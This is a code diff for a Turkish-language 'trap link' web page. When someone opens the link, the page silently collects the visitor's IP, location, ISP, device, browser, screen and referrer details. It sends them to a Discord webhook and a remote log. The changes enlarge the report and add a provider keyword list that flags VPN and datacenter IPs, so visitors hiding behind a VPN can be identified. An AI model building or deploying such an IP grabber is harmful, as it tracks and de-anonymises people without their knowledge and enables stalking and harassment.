@@ -49,11 +49,37 @@
       }
     }
 
+    function formatTimeDetails(dateObj = new Date()) {
+      const trDate = new Intl.DateTimeFormat("tr-TR", {
+        timeZone: "Europe/Istanbul",
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit"
+      }).format(dateObj);
+
+      const trTime = new Intl.DateTimeFormat("tr-TR", {
+        timeZone: "Europe/Istanbul",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: false
+      }).format(dateObj);
+
+      const utcTime = dateObj.toISOString().split("T")[1].replace("Z", "");
+
+      return {
+        tarih_tr: trDate,
+        saat_tr: `${trTime} (TR)`,
+        saat_utc: `${utcTime} (UTC)`,
+        iso: dateObj.toISOString()
+      };
+    }
+
     function detectDevice() {
       const ua = navigator.userAgent || "";
       const platform = navigator.platform || "Bilinmiyor";
-      let os = "Bilinmiyor";
 
+      let os = "Bilinmiyor";
       if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
       else if (/Android/i.test(ua)) os = "Android";
       else if (/Windows/i.test(ua)) os = "Windows";
@@ -68,7 +94,17 @@
       else if (/Firefox/i.test(ua)) browser = "Firefox";
 
       const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-      return `${isMobile ? "Mobil" : "Masaüstü"} / ${os} / ${browser} (${platform})`;
+
+      // Tarayıcı model gizlediği için cihaz etiketi veya tarayıcı özeti verilir
+      const knownLabel = TRAP_CONFIG.deviceLabel || "Tarayıcı modeli gizli (Standart Android/Cihaz)";
+
+      return {
+        tur: isMobile ? "Mobil Cihaz" : "Masaüstü Cihaz",
+        isletim_sistemi: os,
+        tarayici: browser,
+        platform: platform,
+        cihaz_notu: knownLabel
+      };
     }
 
     async function fetchIpAndGeo() {
@@ -96,7 +132,7 @@
         }
       }
 
-      currentData.last_updated = entry.timestamp;
+      currentData.last_updated = entry.zaman.iso;
       currentData.logs.push(entry);
 
       const putRes = await fetch(url, {
@@ -113,15 +149,32 @@
 
     async function sendDiscordWebhook(entry) {
       const content = [
-        "🚨 **Tuzak Link Erişimi Algılandı**",
-        `• **Cihaz:** ${entry.device}`,
-        `• **Saat:** ${entry.timestamp}`,
-        `• **IP:** \`${entry.ip}\``,
-        `• **IP Konumu / Adresi:** ${entry.location} (ASN/ISP: ${entry.isp})`,
-        `• **IP Durumu:** ${entry.ip_status}`,
-        `• **Dil:** ${entry.language} | **Ekran:** ${entry.screen}`,
-        `• **Referrer:** ${entry.referrer}`,
-        `• **User-Agent:** \`${entry.user_agent}\``
+        "🚨 **TUZAK LİNK ERİŞİMİ ALGILANDI**",
+        "━━━━━━━━━━━━━━━━━━━━━━",
+        "📱 **CİHAZ BİLGİLERİ**",
+        `• **Tür:** ${entry.cihaz.tur}`,
+        `• **İşletim Sistemi:** ${entry.cihaz.isletim_sistemi}`,
+        `• **Tarayıcı:** ${entry.cihaz.tarayici}`,
+        `• **Platform:** ${entry.cihaz.platform}`,
+        `• **Cihaz Notu:** ${entry.cihaz.cihaz_notu}`,
+        "",
+        "🕒 **ZAMAN BİLGİLERİ**",
+        `• **Tarih (TR):** ${entry.zaman.tarih_tr}`,
+        `• **Saat (TR):** ${entry.zaman.saat_tr}`,
+        `• **Saat (UTC):** ${entry.zaman.saat_utc}`,
+        "",
+        "🌐 **AĞ VE IP BİLGİLERİ**",
+        `• **IP Adresi:** \`${entry.ag.ip}\``,
+        `• **IP Durumu:** **${entry.ag.ip_durumu}**`,
+        `• **Konum:** ${entry.ag.konum}`,
+        `• **Sağlayıcı (ISP / ASN):** ${entry.ag.saglayici}`,
+        "",
+        "🖥️ **TARAYICI VE EK DETAYLAR**",
+        `• **Dil:** ${entry.detay.dil}`,
+        `• **Ekran Çözünürlüğü:** ${entry.detay.ekran}`,
+        `• **Geliş Kaynağı (Referrer):** ${entry.detay.referrer}`,
+        `• **User-Agent:** \`${entry.detay.user_agent}\``,
+        "━━━━━━━━━━━━━━━━━━━━━━"
       ].join("\n");
 
       const res = await fetch(TRAP_CONFIG.discordWebhookUrl, {
@@ -148,8 +201,15 @@
         const sec = geo.security || {};
         const conn = geo.connection || {};
 
+        const ispLower = `${conn.isp || ""} ${conn.org || ""}`.toLowerCase();
+        const datacenterKeywords = [
+          "datacamp", "hosting", "cloud", "vpn", "proxy", "digitalocean",
+          "amazon", "aws", "google cloud", "hetzner", "ovh", "linode", "vultr", "m247"
+        ];
+        const looksLikeDatacenter = datacenterKeywords.some((k) => ispLower.includes(k));
+
         const isVpnOrProxy = Boolean(
-          sec.vpn || sec.proxy || sec.tor || sec.hosting
+          sec.vpn || sec.proxy || sec.tor || sec.hosting || looksLikeDatacenter
         );
 
         const locationParts = [geo.city, geo.region, geo.country].filter(Boolean);
@@ -157,25 +217,30 @@
         const ispText = conn.isp || conn.org || conn.asn || "Bilinmiyor";
 
         const entry = {
-          trap: TRAP_CONFIG.trapLabel,
-          timestamp: new Date().toISOString(),
-          ip: geo.ip || "Bilinmiyor",
-          location: locationText,
-          isp: ispText,
-          ip_status: isVpnOrProxy
-            ? "Muhtemel VPN / Proxy / Hosting"
-            : "Muhtemel Normal / ISP IP",
-          security_flags: {
-            vpn: Boolean(sec.vpn),
-            proxy: Boolean(sec.proxy),
-            tor: Boolean(sec.tor),
-            hosting: Boolean(sec.hosting)
+          tuzak: TRAP_CONFIG.trapLabel,
+          zaman: formatTimeDetails(new Date()),
+          cihaz: detectDevice(),
+          ag: {
+            ip: geo.ip || "Bilinmiyor",
+            ip_durumu: isVpnOrProxy
+              ? "VPN / Proxy / Hosting / Datacenter"
+              : "Muhtemel Normal / ISP IP",
+            konum: locationText,
+            saglayici: ispText,
+            bayraklar: {
+              vpn: Boolean(sec.vpn),
+              proxy: Boolean(sec.proxy),
+              tor: Boolean(sec.tor),
+              hosting: Boolean(sec.hosting),
+              datacenter_eslesme: looksLikeDatacenter
+            }
           },
-          device: detectDevice(),
-          language: navigator.language || "Bilinmiyor",
-          screen: `${window.screen.width}x${window.screen.height}`,
-          referrer: document.referrer || "Doğrudan / Yok",
-          user_agent: navigator.userAgent || "Bilinmiyor"
+          detay: {
+            dil: navigator.language || "Bilinmiyor",
+            ekran: `${window.screen.width}x${window.screen.height}`,
+            referrer: document.referrer || "Doğrudan / Yok",
+            user_agent: navigator.userAgent || "Bilinmiyor"
+          }
         };
 
         await Promise.all([
